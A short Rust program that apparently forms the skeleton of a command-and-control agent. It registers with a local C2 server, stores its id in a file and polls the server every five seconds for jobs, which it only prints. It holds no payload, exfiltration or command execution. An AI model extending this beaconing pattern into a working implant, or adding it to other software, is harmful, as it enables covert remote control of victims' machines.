use std::thread;
use std::{fs, str::FromStr, time::Duration};
use ureq;
use uuid::Uuid;

const API: &str = "http://127.0.0.1:5000";

fn main() {
    let ureq_agent: ureq::Agent = ureq::AgentBuilder::new()
        .timeout_read(Duration::from_secs(5))
        .timeout_write(Duration::from_secs(5))
        .build();

    // Try to read id from file
    println!("Try to read id from file");
    let id = match fs::read_to_string("./id") {
        Ok(s) => {
            println!("Read ok, got id {}", s);
            Uuid::from_str(&s).unwrap()
        }
        Err(_) => {
            println!("Read failed, registering to c2");
            let id = ureq_agent
                .post(format!("{API}/agents").as_str())
                .call()
                .unwrap()
                .into_string()
                .unwrap();
            println!("Registration successful, got id {}", id);
            println!("Saving id to file");
            match fs::write("./id", &id) {
                Ok(_) => println!("Write success"),
                Err(e) => println!("Write fail : {e}"),
            };
            Uuid::from_str(&id).unwrap()
        }
    };

    // Long pooling
    loop {
        // Try to get a job
        match ureq_agent
            .get(format!("{API}/jobs/{id}").as_str())
            .call(){
              Ok(resp) => {
                let job = resp.into_string().expect("Cannot convert resp into string");
                println!("Got job: {job}");
              },
              Err(ureq::Error::Status(code, resp))=>{
                if code == 404{
                  println!("No job available");
                }
                else{
                  println!("Got status {code} with resp {:?}", resp);
                }
              },
              Err(_)=>{}
            }

        thread::sleep(Duration::from_secs(5));
    }
}
